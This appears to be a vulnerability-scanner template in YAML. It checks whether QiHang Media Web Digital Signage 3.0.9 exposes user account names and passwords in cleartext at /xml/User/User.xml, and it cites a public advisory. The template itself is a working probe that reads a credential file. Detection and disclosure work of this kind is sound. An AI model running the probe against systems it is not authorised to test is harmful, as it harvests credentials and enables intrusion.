id: qihang-media-disclosure

info:
  name: QiHang Media Web Digital Signage 3.0.9 - Cleartext Credentials Disclosure
  author: gy741
  severity: high
  description: QiHang Media Web Digital Signage 3.0.9 - Cleartext Credentials Disclosure 存在认证绕过漏洞。未授权访问者可获取配置、凭证、用户数据或系统元信息，从而为后续攻击提供情报支持。
  reference:
    - https://www.zeroscience.mk/en/vulnerabilities/ZSL-2020-5579.php
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
  metadata:
    max-request: 1
  tags: qihang,exposure,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/xml/User/User.xml"

    matchers:
      - type: word
        part: body
        words:
          - "<?xml version"
          - "<Users>"
          - "account="
          - "password="
        condition: and
